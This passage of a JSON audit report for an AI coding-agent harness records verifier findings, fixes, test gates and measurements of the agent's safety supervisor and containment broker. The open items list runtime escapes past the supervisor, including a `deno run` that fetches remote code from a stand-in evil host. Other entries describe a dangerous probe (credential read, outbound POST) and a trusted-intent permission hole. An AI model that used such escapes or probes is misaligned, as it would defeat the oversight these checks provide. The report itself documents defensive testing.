+        "fixCommit": "not named in F-B's table; the plural nouns do appear in the new `CLOUD_IDENTITY_SUBJECT_RE` from the C6 fix",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-B C13",
+        "severity": "LOW",
+        "verifier": "V-B",
+        "finding": "No progress-type event fires during the bounded 12 s in-path wait.",
+        "fixCommit": "not fixed — out of Lane B's files",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-B C14",
+        "severity": "LOW–MEDIUM",
+        "verifier": "V-B",
+        "finding": "B3 was unverified: the lane's own test looped over an empty list, and the prompt-build-failure skip returned no `queueWaitMs` and recorded 0.",
+        "fixCommit": "80aa136 (product half) + 6637d68 (the empty test)",
+        "migratedTest": "tests/unit/orchestrator/supervisor-queue.test.ts (\"a slow reviewer never denies ordinary work\") — non-empty, all finite ≥ 0, monotonic non-decreasing, reason string quoting the same number",
+        "reverifiedInStep2": true,
+        "step2Note": "Re-run against the installed binary as part of reviewer-cost 9/0; the B3 assertion now reads a forced overflow."
+      },
+      {
+        "id": "V-B C18",
+        "severity": "MEDIUM",
+        "verifier": "V-B",
+        "finding": "The five shapes' corpus anchors were far narrower than the shipped patterns — \"which is precisely how C4/C7/C8 got in\".",
+        "fixCommit": "80aa136 (inferred) — each widening rewritten to the exact form",
+        "migratedTest": "auto-mode-shell-tier-exact-shapes.test.ts + the 93-row shape corpus",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-C 1c",
+        "severity": "MEDIUM-HIGH",
+        "verifier": "V-C",
+        "finding": "C1 was false: `transcriptMessages = toSummarize.slice(1)` is by construction NEW material the prior state has never seen, so the merge clip destroys the only read it gets — a 901–2,400-char body loses up to 62.5% of its middle.",
+        "fixCommit": "5671ef7",
+        "migratedTest": "tests/verification/vc-c1-merge-fidelity.test.ts (2 red) → tests/unit/orchestrator/compaction-merge-fidelity.test.ts; plus context-compaction-budget.test.ts and tests/integration/prompt-cost.test.ts",
+        "reverified": "V-C's two files 4 pass / 0 fail; the integration rig pins 1,680 head characters per clipped body on both requests, where the merge budget would have left 630.",
+        "reverifiedInStep2": true,
+        "step2Note": "Re-measured on the installed binary: `installedRemeasurements[4]`."
+      },
+      {
+        "id": "V-C 1d",
+        "severity": "MEDIUM",
+        "verifier": "V-C",
+        "finding": "The 900-char clip applied to `apply_patch` and diff results too.",
+        "fixCommit": "5671ef7 — edit tools and any patch-shaped body exempt even in the incremental case",
+        "migratedTest": "compaction-merge-fidelity.test.ts; context-compaction-budget.test.ts",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-C 1e",
+        "severity": "MEDIUM",
+        "verifier": "V-C",
+        "finding": "The C1 guard case was tautological — `recordingGateway(MERGED_STATE)` returns the same constant for any request.",
+        "fixCommit": "5671ef7 — the case is kept for section structure but every fidelity assertion now reads `rig.seen[n]`",
+        "migratedTest": "context-compaction-budget.test.ts",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-C 2b / 2c",
+        "severity": "LOW-MEDIUM",
+        "verifier": "V-C",
+        "finding": "C2 was false: `AgentLoop.interject()` folds mid-run steering into the same run and `turn` only resets per `run()`, so a mode ask lands on a `turn > 1` working-phase request with the routing gone. And the JIT complement was not delivered — `JitDoctrineSection` had no `modes` member.",
+        "fixCommit": "5671ef7 — phase gate reverted, `modes` added as a JIT section with extraction, delivery counting and a refusal when `hasModeTools` is not false",
+        "migratedTest": "vc-c2-modes-working-phase.test.ts (2 red) → tests/unit/orchestrator/doctrine-modes-routing.test.ts; plus doctrine-phase.test.ts with four near-misses that must NOT trigger",
+        "reverified": "4 pass / 0 fail on V-C's two migrated files.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-C 3d",
+        "severity": "LOW",
+        "verifier": "V-C",
+        "finding": "Mutation coverage: only `tests/unit/orchestrator/brief-ledger.test.ts` goes red if C3's refusal prose is reverted.",
+        "fixCommit": "not fixed",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-C 3e",
+        "severity": "LOW",
+        "verifier": "V-C",
+        "finding": "UNWIRED: `tests/integration/finish-path-cost.test.ts` contained no `not a recognised check` matcher, so Lane C's handshake with Lane A was asserted nowhere.",
+        "fixCommit": "03aaa7f",
+        "migratedTest": "tests/integration/finish-path-cost.test.ts (\"A1 — a citation for a command that is not a check\", 2 cases)",
+        "reverified": "finish-path-cost.test.ts 6 pass / 0 fail; A1 = 7 completions with the receipt on completion 5.",
+        "reverifiedInStep2": true,
+        "step2Note": "Re-run against the installed binary: 6 pass / 0 fail."
+      },
+      {
+        "id": "V-C 4",
+        "severity": "HIGH",
+        "verifier": "V-C",
+        "finding": "§3.3 confirmed as a product defect: on codex the prefix diverges one message early on every request carrying a tail, because `measureComposition` was handed `stableMessages` while the wire got `withTailFolded(...)`.",
+        "fixCommit": "7eb6ca8",
+        "migratedTest": "tests/verification/vc-33-fold-prefix.test.ts (2 green = defect present) → tests/unit/orchestrator/agent-loop-fold-prefix.test.ts (4 cases) + agent-loop-ephemeral-fold.test.ts",
+        "reverified": "Same rig V-C used: codex 1→2 went 313/836 → 835/836 and 2→3 went 562/1,085 → 1,586/1,587; the openai control is unmoved.",
+        "reverifiedInStep2": true,
+        "step2Note": "Re-measured by this pass in-process — `installedRemeasurements[3]`. It cannot be measured on the installed binary; see notProven."
+      },
+      {
+        "id": "V-C 5",
+        "severity": "HIGH (cost, not correctness)",
+        "verifier": "V-C",
+        "finding": "The skills catalog is 9,293 B = 32.8% of the working prefix (182 skills across 21 domains, from `SkillLoader.catalogPrompt()`, loader.ts:112) — 12.5× what C2 moved.",
+        "fixCommit": "not fixed — F-C: \"untouched and remains the largest block after the doctrine\"",
+        "reverifiedInStep2": false,
+        "backlogged": true
+      },
+      {
+        "id": "V-C 7 / 7b",
+        "severity": "LOW",
+        "verifier": "V-C",
+        "finding": "The `usage-attribution` failure belonged to another lane, and I1's runtime enforcement is weakened (not broken) to `attribution?.role ?? \"unattributed\"`.",
+        "fixCommit": "resolved by cb1b700",
+        "migratedTest": "tests/unit/gateway/usage-attribution.test.ts (9/9)",
+        "reverified": "Compile-time enforcement stands; runtime enforcement is now observational, by design.",
+        "reverifiedInStep2": false
+      }
+    ],
+    "stillOpenAfterTheFixRound": [
+      "V-L0 #5, #9, #12",
+      "V-A #3a",
+      "V-B C10 (partial), C13, and four pre-existing runtime escapes cleared at 730fd97 too: `bun --preload ./evil.ts app.ts`, `deno run -A https://evil.tld/mod.ts`, `python -c '…'`, `NODE_OPTIONS=--require=…`",
+      "V-C 3d, V-C 5 (the skills catalog)",
+      "A mode asked for by an `interject()` mid-run still does not re-run `doctrineForRequest` (JIT fires only from the message that STARTS a run, agent-loop.ts:1296) — Lane A's file",
+      "The content-hash memory cannot see a `bash` rewrite (f006144 names the boundary in code; it does not close it)",
+      "`--uncontained` (`unsandboxedShell = \"review\"`, 68 `bash` reasoned reviews) is unmeasured by Lane B, V-B and F-B alike",
+      "Lane A's A2 per-criterion completion saving is unproven — only the turn refund is proven; the behavioural claim needs a live run"
+    ]
+  },
+  "realDefectsFound": [
+    {
+      "by": "this closing pass (3C, first sitting)",
+      "commit": "793d0ce",
+      "severity": "MEDIUM-HIGH",
+      "what": "P3B I2 put an origin on every synthetic re-prompt and the persistence seam files those as `user_msg` rows carrying `harness`. NOTHING READ THE MARKER. A gate, a nudge and — after 730fd97 tagged `drainHarnessNotes` — every just-in-time doctrine note reached the three readers that mean \"what the user said\": `/rewind`'s turn list, session replay, and the permission check's trusted-intent corpus.",
+      "howItSurfaced": "`tests/integration/engine-interject.test.ts`: a two-message conversation came back with 2 KB of house style sitting between the founder's words, filed as the founder's words.",
+      "whyItMatters": "The trusted corpus is the one that matters beyond cosmetics — a harness note carries connector notes and teammate mail, which nobody typed. It is the same class of hole as V-L0 #15, one layer further out: #15 was a synthetic message reaching persistence untagged; this was a tagged one being read as the user's anyway.",
+      "fix": "One predicate, `isHarnessAuthoredTurn` (engine.ts:462-478), read at all four sites: `replayEvents`, `eventsToTranscript`, `Engine.listUserTurns`, and the trusted-intent loop in the permission check.",
+      "tests": "tests/unit/orchestrator/engine-harness-turns.test.ts (new, 82 lines), tests/unit/orchestrator/session-transcript.test.ts (+38), tests/unit/protocol/replay.test.ts (+18)",
+      "reverified": "In this pass's unit rerun (4,734/0/1) and, on the INSTALLED binary, by `installedRemeasurements[0]`: the installed engine renders the resumed conversation with zero harness texts as user turns."
+    },
+    {
+      "by": "this closing pass (3C, first sitting)",
+      "commit": "2f13c19",
+      "severity": "LOW (gate reliability)",
+      "what": "Two gateway test rigs did not compile under the strict tsconfig the Phase 3 gate reads them with — `budget-reservations.test.ts` and `incident-completion-join.test.ts`.",
+      "fix": "The rigs were typed to the gate they are read under. No product code changed.",
+      "reverified": "`npx tsc -p .codex/.../gates/tsc/tsconfig.strict.json` exit 0 over 46 files, `scenario.ts` now among them."
+    },
+    {
+      "by": "this closing pass (3C, second sitting)",
+      "commit": "not a product defect — a driver bug, fixed in the driver",
+      "severity": "informational",
+      "what": "The first run of this pass's own installed-binary driver passed a RELATIVE output directory, so `RUNE_HOME` resolved against the child's cwd (the fixture root) and the installed engine printed \"No API keys configured\" and wrote no database. Worth recording because it is the failure mode a measurement that silently uses the wrong home would hide: the driver now resolves the path and fails loudly when the child writes no database."
+    }
+  ],
+  "gates": {
+    "note": "Two directories. `.codex/audit-20260910/handoff/phase3/gates/` holds the first 3C sitting's logs; `.codex/audit-20260910/handoff/phase3/gates3c/` holds this pass's reruns. The rule applied: `tests/helpers/scenario.ts` was modified at 19:41 local, AFTER every gate in `gates/` (19:31–19:37) and after the install (19:38–19:40). Every gate that reads that file — or reads the whole tree — was therefore rerun. `crates/` has not moved since 9876957 (2026-09-11 01:17), so the three cargo logs are reused.",
+    "checks": [
+      {
+        "name": "unit",
+        "command": "RUNE_TOOLS_BIN=<debug> RUNE_TOOLS_BINARY=<debug> bun test tests/unit </dev/null",
+        "exit": 0,
+        "result": { "pass": 4734, "fail": 0, "skip": 1, "files": 377, "expectCalls": 17364 },
+        "wallSeconds": 63.7,
+        "reuse": "RERUN by this pass",
+        "why": "The first sitting's unit.log is 19:36:23, after 2f13c19 (19:35:14) — but before the scenario.ts edit. Identical counts either way, which is itself the evidence that the rig change did not move a unit test.",
+        "note": "Sandbox OFF.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/unit.log",
+        "logSha256": "be2ee4804b9d4ba7ca494fcdd489453353c1262861d104a9351c4ae2d446d846"
+      },
+      {
+        "name": "integration",
+        "command": "RUNE_TOOLS_BIN=<debug> RUNE_TOOLS_BINARY=<debug> bun test tests/integration </dev/null",
+        "exit": 0,
+        "result": { "pass": 260, "fail": 0, "skip": 7, "files": 45 },
+        "wallSeconds": 112.4,
+        "reuse": "RERUN by this pass",
+        "why": "MUST rerun: the whole directory is driven by tests/helpers/scenario.ts, which this pass changed. The first sitting's log (19:31:05) predates both the edit and 2f13c19. Same counts as that log: 260/7/0.",
+        "note": "Sandbox OFF. RUNE_TEST_PLAYWRIGHT deliberately unset — V4b recorded that setting it makes this directory flaky (215/5/14 then 229/5/0).",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/integration.log",
+        "logSha256": "71a1686655d80c8d53fd9ca453b9c1f247b377d79aff9a637fc1e181d793bcb9"
+      },
+      {
+        "name": "lifecycle-durability, alone",
+        "command": "bun test tests/integration/lifecycle-durability.test.ts </dev/null",
+        "exit": 0,
+        "result": { "pass": 45, "fail": 0, "expectCalls": 192 },
+        "wallSeconds": 26.4,
+        "reuse": "RERUN by this pass",
+        "why": "The default-path control for the scenario.ts change: the suite that exercises the rig hardest, run alone, before anything was pointed at the installed binary. It also prints the ledger guard — `~/.rune/rune.db cost rows 2931 → 2931; newest 2026-09-10T19:20:44.046Z → unmoved`.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/lifecycle-alone.log",
+        "logSha256": "bd3960aa9f3740d64689a5da6e9a75d12c7246712a5f0aab774ce56fe0cc41c4"
+      },
+      {
+        "name": "typecheck",
+        "command": "TURBO_FORCE=true bun run typecheck",
+        "exit": 0,
+        "result": { "tasks": "15 successful, 15 total", "cached": "0 cached, 15 total" },
+        "wallSeconds": 4.3,
+        "reuse": "RERUN by this pass (forced uncached)",
+        "why": "The first, unforced attempt came back FULL TURBO from cache and was discarded as not a gate.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/typecheck.log",
+        "logSha256": "376f58dd66516e6b44502c2cebdeef5b27552f1ef15891f704ac1c369934188c"
+      },
+      {
+        "name": "lint",
+        "command": "TURBO_FORCE=true bun run lint",
+        "exit": 0,
+        "result": { "tasks": "7 successful, 7 total", "cached": "0 cached, 7 total" },
+        "wallSeconds": 2.7,
+        "reuse": "RERUN by this pass (forced uncached)",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/lint.log",
+        "logSha256": "e41642e145ad1da3f76ee62eca001bd0822a0f2d11a32a371865144cdbf9f305"
+      },
+      {
+        "name": "format:check",
+        "command": "bun run format:check",
+        "exit": 0,
+        "result": "All matched files use Prettier code style!",
+        "reuse": "RERUN by this pass",
+        "why": "`prettier --check .` covers tests/ and docs/, both of which this pass changed.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/format-check.log",
+        "logSha256": "1d66faad74f5e8709353f7288592866bd3a9095da1174a916e7aa632949971e2"
+      },
+      {
+        "name": "tsc --strict over the Phase 3 files",
+        "command": "npx tsc -p .codex/audit-20260910/handoff/phase3/gates/tsc/tsconfig.strict.json",
+        "exit": 0,
+        "result": "0 errors over 46 files",
+        "reuse": "RERUN by this pass, and the gate itself WIDENED",
+        "why": "The first sitting's log was written at 19:35:00, fourteen seconds before the commit it gated, and carried no summary line at all — only two npm notices — so it proved exit 0 by absence. This pass reran it AND added `tests/helpers/scenario.ts` to the include list (45 → 46 files), because 3C changed that file and a gate that does not read the file it gates is not a gate.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/tsc-strict.log",
+        "logSha256": "c137a995982ac05f4731b9ceaffeb3c6bbc7ceb3c1317c6d76cec54a7fc07e64"
+      },
+      {
+        "name": "git diff --check",
+        "command": "git diff --check",
+        "exit": 0,
+        "result": "no output (no whitespace errors)",
+        "reuse": "RERUN by this pass",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/git-diff-check.log",
+        "logSha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      },
+      {
+        "name": "eval (mock)",
+        "command": "bun run eval",
+        "exit": 0,
+        "result": {
+          "measured": "63/63 (100.0%)",
+          "raw": "63/63 (100.0%)",
+          "baseline": "unchanged",
+          "transcript": "harness talk 3% · silence 0% (ceilings 15% / 15%)",
+          "governance": "0.26 completions/task (tolerance +20% vs baseline)"
+        },
+        "reuse": "RERUN by this pass",
+        "why": "The first sitting's log (19:32:57) predates 2f13c19 and the scenario edit. Identical result.",
+        "note": "Sandbox OFF. Mock LLM provider; no live request.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/eval.log",
+        "logSha256": "27d26552b347ec707ada279b3b1c7df93c221f697bc6fa155270e3985c3168d3"
+      },
+      {
+        "name": "eval:auto-safety (offline)",
+        "command": "bun run eval:auto-safety --offline",
+        "exit": 0,
+        "result": {
+          "scenarios": 227,
+          "overall": "P 92.8% [86–96]  R 89.1% [82–94]  F1 90.9%",
+          "floorFrom§7": "P 90.0 / R 89.1 / F1 89.6",
+          "mechanicalLayer": "55/55 blocks held · 116/116 allows preserved (171 rows)",
+          "supervisorShapes": "93 rows scored apart — P 100.0% [94–100] R 100.0% [94–100] F1 100.0%; 56/56 dangerous watched, 37/37 ordinary cleared",
+          "liveRequests": 0
+        },
+        "reuse": "RERUN by this pass",
+        "whatThisPassLearnedRunningIt": "Run WITHOUT `--offline`, the script tries to reach a real provider: it refused with \"Provider \\\"anthropic\\\" has no usable credential on this machine (available: openrouter, google, codex)\" and exited 1. It refused because the default provider happened to have no key here, NOT because the script declines to spend — `--offline` is the flag that makes zero spend a property rather than an accident. The first sitting's log carries `--offline` in its own first line, so it too was offline.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/eval-auto-safety.log",
+        "logSha256": "3e09799539524a89d6dc804c0ccea7d1389eafbc52ede90721ae1b2aa18a9b24"
+      },
+      {
+        "name": "cargo test",
+        "command": "cargo test --locked (rune-index, rune-sandbox, rune-tools)",
+        "exit": 0,
+        "result": "green, doc-tests 0/0/0",
+        "reuse": "REUSED from the first sitting (2026-09-11 19:32:05)",
+        "why": "`crates/` has not been touched since 9876957 (2026-09-11 01:17:55) and the working tree has no modification under `crates/`. The log postdates 793d0ce (19:27:09) in any case.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates/cargo-test.log",
+        "logSha256": "3d383ab4fc89eacf0c097037b582ff5142020670fb0230ba16e5755505b29e67"
+      },
+      {
+        "name": "cargo clippy",
+        "command": "cargo clippy (all crates)",
+        "exit": 0,
+        "result": "0 warnings — rune-sandbox, rune-index, rune-tools checked",
+        "reuse": "REUSED from the first sitting (2026-09-11 19:32:33)",
+        "why": "Same: crates/ unmoved. macOS only — see notProven for Linux.",
+        "log": ".codex/audit-20260910/handoff/phase3/gates/cargo-clippy.log",
+        "logSha256": "cf1cbe191bbe1158603f23600c83f9d243b7c05cf41231fafe09602f7bdf9690"
+      },
+      {
+        "name": "cargo fmt --check",
+        "command": "cargo fmt --check",
+        "exit": 0,
+        "result": "no output",
+        "reuse": "REUSED from the first sitting (2026-09-11 19:31:34)",
+        "log": ".codex/audit-20260910/handoff/phase3/gates/cargo-fmt.log",
+        "logSha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      },
+      {
+        "name": "docker probe",
+        "command": "( docker version --format '{{.Server.Version}}' > docker-probe.log 2>&1 & p=$!; sleep 15; kill $p )",
+        "exit": "killed at 15 s",
+        "result": "one newline, nothing else",
+        "reuse": "RERUN by this pass",
+        "log": ".codex/audit-20260910/handoff/phase3/gates3c/docker-probe.log",
+        "logSha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
+      }
+    ],
+    "summary": "10 rerun, 3 reused (all three cargo), 1 probe. Zero failures. The two suites with counts are identical to the first sitting's: unit 4,734/0/1 over 377 files and integration 260/0/7 over 45 files."
+  },
+  "installedRemeasurements": [
+    {
+      "id": "(a) attribution equalities",
+      "subject": "the installed binary, driven through `tests/helpers/scenario.ts`",
+      "binary": "/Users/ritikyadav890/.rune/bin/rune (the launcher, sha256 5a22d151…) which execs rune-compiled (28668d09…). The launcher was chosen over rune-compiled because it is what `rune` means on this machine — it sets RUNE_TOOLS_BIN to the INSTALLED rune-tools (c5b44f6e…), so this measurement grades the installed PAIR.",
+      "proofItWasTheInstalledBinary": "The binary prints its own build on its header: `v0.4.1-dev+2f13c19` in `.codex/audit-20260910/handoff/phase3/installed/attribution/resume-render.log`.",
+      "method": "`.codex/audit-20260910/handoff/phase3/installed/driver-installed-attribution.ts` — a scratch RUNE_HOME whose only route is a loopback mock, `assertNoLiveCredentials` before the process starts, the same 5-action script `tests/integration/overhead-attribution.test.ts` uses, then `bun run scripts/overhead-report.ts --db <scratch db> --no-pilots --blackbox <none> --out <json>` by hand.",
+      "numbers": {
+        "costRows": 6,
+        "costRowsWithRoleTag": 6,
+        "equal": true,
+        "userMsgWithOriginMarker": 2,
+        "scriptedReprompts": 2,
+        "equal2": true,
+        "markersInTheDatabase": ["gate:execution-evidence", "nudge:empty-completion"],
+        "userMsgRows": 3,
+        "markedHarnessRows": 2,
+        "unmarkedRows": ["Add src/version.ts exporting VERSION, then run node check.mjs."],
+        "harnessTextsRenderedAsAUserTurnOnResume": 0
+      },
+      "arithmeticNote": "The driver read 5 cost rows from the database BEFORE the resume turn, and the report — run after it — counts 6. Both are right; they were taken at different moments of the same session.",
+      "the793d0ceHalf": "Two surfaces, and they answer differently on purpose. The WIRE conversation a resumed process sends the model carries all six user-role messages including the harness re-prompts — it should: they were sent, and the model's next answer depends on them. What must not carry them is the reader that means \"what the user said\", and the installed binary renders the resumed conversation with exactly two user lines, the founder's two, and none of the four harness strings.",
+      "files": [
+        ".codex/audit-20260910/handoff/phase3/installed/attribution/result.json",
+        ".codex/audit-20260910/handoff/phase3/installed/attribution/overhead-report-installed.json",
+        ".codex/audit-20260910/handoff/phase3/installed/attribution/resume-render.log",
+        ".codex/audit-20260910/handoff/phase3/installed/attribution/work/home/.rune/rune.db",
+        ".codex/audit-20260910/handoff/phase3/installed/installed-overhead-attribution.log (the suite itself, 9 pass / 0 fail, sha256 1f9d5e45cc79fe519ce6bdf6efa284eaf9a87db909fafa6499fc6d15cdac7569)"
+      ]
+    },
+    {
+      "id": "(b) the finish path",
+      "subject": "the installed binary",
+      "method": "`RUNE_SCENARIO_CLI=~/.rune/bin/rune bun test tests/integration/finish-path-cost.test.ts` — four scripted runs spawned through the same rig.",
+      "numbers": {
+        "A3 script B (green check → no-op write → finish)": "6 completions, ZERO `gate:` origins, and the run said why on its own audit trail (`changed no file`)",
+        "A3 script C (control: the write DID change a file)": "7 completions, `gate:execution-evidence` present, exactly B + 1",
+        "A1 (a citation for a command that is not a check)": "7 completions, no gate, the receipt `not a recognised check` on the prompt of completion 5 and said ONCE",
+        "A2 (three criteria, each cited one completion late)": "9 completions, 3 turns carried forward, no gate, turns used ≤ maxTurns"
+      },
+      "result": "6 pass / 0 fail / 17 expect() calls",
+      "files": [
+        ".codex/audit-20260910/handoff/phase3/installed/installed-finish-path-cost.log (sha256 26a084e39f7b22cb88429f8f346875c8a9c6106cdd6d8de661b8fc900c983c0b)"
+      ]
+    },
+    {
+      "id": "(c) the reviewer",
+      "subject": "the installed binary",
+      "method": "`RUNE_SCENARIO_CLI=~/.rune/bin/rune bun test tests/integration/reviewer-cost.test.ts` — five arms: `before` (supervisor = all), `after` (the shipped tier), `reverted` (the five shapes V-B proved unsafe), `unusual` (the dangerous probe), `hung` (a reviewer that never answers).",
+      "numbers": {
+        "B1 ordinary script": "reviewer (`utility`) calls 6 before → 1 after; the five bash decisions are all `supervised_tier`, none `classifier_reasoned`, none `classifier_unavailable`",
+        "B1 the repaired shapes": "back under the supervisor — one decision per command, every one `supervised_tier` / `allow`, screens strictly above the ordinary script's",
+        "B1 web_search": "`NCBI datasets` is no longer rated high and no longer reaches the reasoned reviewer",
+        "the dangerous probe": "STILL SCREENS — the credential read, the publish and the out-of-workspace delete are all refused by the containment broker (3 denials, the last one `critical`), and the outbound POST still costs a supervisor screen",
+        "B2": "a hung reviewer is bounded by ONE deadline rather than two, and the decision still lands",
+        "B3": "the queue's own wait reaches the persisted audit row"
+      },
+      "result": "9 pass / 0 fail / 46 expect() calls, 19.6 s (the hang arm is most of it)",
+      "files": [
+        ".codex/audit-20260910/handoff/phase3/installed/installed-reviewer-cost.log (sha256 59310875e336d478223b8d5696ca68a80b650facdc07bdd8a3531070f114c736)"
+      ]
+    },
+    {
+      "id": "(d) the fold prefix on the codex-shaped route",
+      "subject": "IN-PROCESS at this source — NOT the installed binary. See notProven[0] for why it cannot be.",
+      "method": "`bun test tests/unit/orchestrator/agent-loop-fold-prefix.test.ts agent-loop-ephemeral-fold.test.ts tests/unit/gateway/prompt-composition-prefix.test.ts` — the real AgentLoop on a codex-shaped route against a recording gateway, with an openai route as the control.",
+      "numbers": {
+        "codex 1→2": "3 of 3 stable messages shared, 835 of 836 prefix bytes",
+        "codex 2→3": "5 of 5 stable messages shared, 1,586 of 1,587 prefix bytes",
+        "openai 1→2 (control)": "3 of 3 messages, 343 of 886 bytes — unmoved from V-C's reading",
+        "openai 2→3 (control)": "5 of 5 messages, 592 of 1,135 bytes — unmoved"
+      },
+      "result": "17 pass / 0 fail over 3 files",
+      "installedComplement": "The half of §3.3 that CAN be driven through the installed binary is the non-folding host, and it was: `tests/integration/prompt-cost.test.ts` asserts that the cacheable prefix is stable up to the fold point on every consecutive lead pair. Measured on the installed run, `diverged == fold` on all sixteen non-compaction pairs (the two pairs that span a forced compaction diverge at message 2, which is what a rewritten history is supposed to do).",
+      "files": [
+        ".codex/audit-20260910/handoff/phase3/gates3c/fold-prefix.log (sha256 37c59ee57fa61ec58d1a8e34bff13f7b5e1331ce6fe5c426751480cb47a8e7c3)"
+      ]
+    },
+    {
+      "id": "(e) compaction fidelity across two compactions",
+      "subject": "the installed binary",
+      "method": "`RUNE_SCENARIO_CLI=~/.rune/bin/rune LANE_C_MEASURE_OUT=<path> bun test tests/integration/prompt-cost.test.ts` — one spawned run, 22 lead requests, two forced compactions driven by a provider-side over-limit rejection.",
+      "numbers": {
+        "summarizer request 1 (7 messages, no prior state)": "16,023 bytes — the pinned first-compaction baseline, unmoved",
+        "summarizer request 2 (15 messages, incremental, `PRIOR STATE:` present)": "21,629 bytes — BIGGER than the first, and honestly so: it folds the first one's verbatim tail plus everything since, at the same fidelity",
+        "clipped tool-result heads": "identical on both requests — the merge does not read its new segment at a lower fidelity than a first compaction would",
+        "system prompt": "opening 22,059 B, working 19,001 B, phase-switch saving 3,058 B (the pinned value, unmoved)"
+      },
+      "whatItProves": "A criterion sitting in the middle of a long tool result survives two compactions: request 2 renders the same head length per clipped body that request 1 did, so the 630-character middle C1 would have destroyed is still there.",
+      "result": "5 pass / 0 fail / 66 expect() calls",
+      "files": [
+        ".codex/audit-20260910/handoff/phase3/installed/installed-prompt-cost.log (sha256 5db3401f895ebfe5edf6221580aea90d355b7de4e4e14721f41fd8ddd076fcfd)",
+        ".codex/audit-20260910/handoff/phase3/installed/lane-c-installed/measured.json",
+        ".codex/audit-20260910/handoff/phase3/installed/lane-c-installed/summarizer-1.txt (16,023 B)",
+        ".codex/audit-20260910/handoff/phase3/installed/lane-c-installed/summarizer-2.txt (21,629 B)",
+        ".codex/audit-20260910/handoff/phase3/installed/lane-c-installed/system-opening.txt (22,059 B)",
+        ".codex/audit-20260910/handoff/phase3/installed/lane-c-installed/system-working.txt (19,001 B)"
+      ]
+    }
+  ],
+  "rigHook": {
+    "what": "`tests/helpers/scenario.ts` gained `RunOptions.cli`, defaulting to `RUNE_SCENARIO_CLI` and then to source. `spawnRun` builds `[cli, ...args]` when one is given and `[\"bun\", RUNE_CLI, ...args]` otherwise — the second is byte-for-byte the array it built before, so the default path did not move.",
+    "loudOnPurpose": "`resolveScenarioCli` throws when the path does not exist or is not executable. A verification pass that asks for the installed binary and silently gets the source one back produces a measurement labelled with the wrong subject, which is worse than no measurement.",
+    "controls": [
+      {
+        "name": "default path unchanged",
+        "evidence": "`bun test tests/integration/lifecycle-durability.test.ts` alone, with RUNE_SCENARIO_CLI unset: 45 pass / 0 fail / 192 expect() calls. Then the whole integration directory: 260/0/7, identical to the pre-change log."
+      },
+      {
+        "name": "the source arm still works and is the default",
+        "evidence": "`.../installed/control-source-overhead-attribution.log` — the same suite with the variable unset, 9 pass / 0 fail (sha256 d0182e1c178efd1c7860396a8ab058acb4f410931206c3240636f40cfad17b65)."
+      },
+      {
+        "name": "the hook is live and the suites read it",
+        "evidence": "`.../installed/control-badcli-overhead-attribution.log` — RUNE_SCENARIO_CLI pointed at a path that does not exist: 1 fail, `error: RUNE_SCENARIO_CLI / RunOptions.cli points at a binary that does not exist: /nonexistent/rune-does-not-exist` (sha256 67c609cd0c68fb158ce0087a858a12f4c2e6e7560464d64b486c604a4894badb). Without this control, \"the tests passed against the installed binary\" would rest on the assumption that the variable was read."
+      }
+    ],
+    "ideReportWasStale": "The handoff reported an IDE error, `Property 'cli' does not exist on type 'RunOptions'` at ~scenario.ts:654. It does not reproduce: `RunOptions` is declared once in the repository (scenario.ts:424) and carried `cli` already. `tsc --strict` over the file is clean. The IDE had cached the file from before the interface edit."
+  },
+  "linuxImages": [
+    {
+      "tag": "rune-containment-audit:20260912",
+      "built": false,
+      "ran": false,
+      "result": "LINUX IMAGE NOT RERUN.",
+      "reasons": [
+        "The Docker daemon does not answer. `docker version --format '{{.Server.Version}}'` run UNSANDBOXED produced one newline and nothing else, and was still blocked when a 15 s kill landed.",
+        "`/var/run/docker.sock` does not exist. The CLI is installed and current (`/usr/local/bin/docker`, Docker version 29.1.3, build f52814d) and Docker Desktop processes are running (pids 1049, 1132, 1133), so this is a daemon that has not come up, not a missing install.",
+        "DISK IS NOT THE REASON THIS TIME. `df -h /` read 19 GiB free before the probe and 29 GiB after the pass's suites cleaned up — well above the 8 GiB floor. V4b's probe, twenty minutes apart, had already ruled the disk out at 10 GiB free; this pass confirms it at nearly twice that."
+      ],
+      "repairAttempted": false,
+      "log": ".codex/audit-20260910/handoff/phase3/gates3c/docker-probe.log",
+      "logSha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+      "whatStaysOpenBecauseOfIt": [
+        "`cargo clippy --all-targets --all-features -D warnings` has NEVER run green on Linux since the dead `has_pair` helper was removed from crates/rune-sandbox/src/linux.rs. The symbol is confirmed gone from the committed file; the gate has not run.",
+        "The Phase 2 fix-round crate changes (311e901, 9876957) have never been rerun on Linux.",
+        "The toolchain-root symlink probe — `probe.sh`'s `~/.local/bin -> $HOME` re-probe, V1-4's ACTUAL escape as opposed to the unit test that models it — has never been executed.",
+        "The Linux `bun` integration step has never loaded with `process-identity.ts` present."
+      ]
+    }
+  ],
+  "notProven": [
+    {
+      "id": "the codex fold, on the installed binary",
+      "why": "`foldsEphemeralTail(providerId)` is `providerId === \"codex\"` (cache-policy.ts:110) and the codex route speaks the Responses API, while `tests/helpers/mock-model-server.ts` serves `/chat/completions` and nothing else (mock-model-server.ts:532). The scenario rig's scratch home configures exactly one provider, `custom`. So no loopback mock can present as the folding host, and re-measurement (d) is in-process at this source rather than through the installed binary. This is a structural property of the rig, not a shortcut taken here."
+    },
+    {
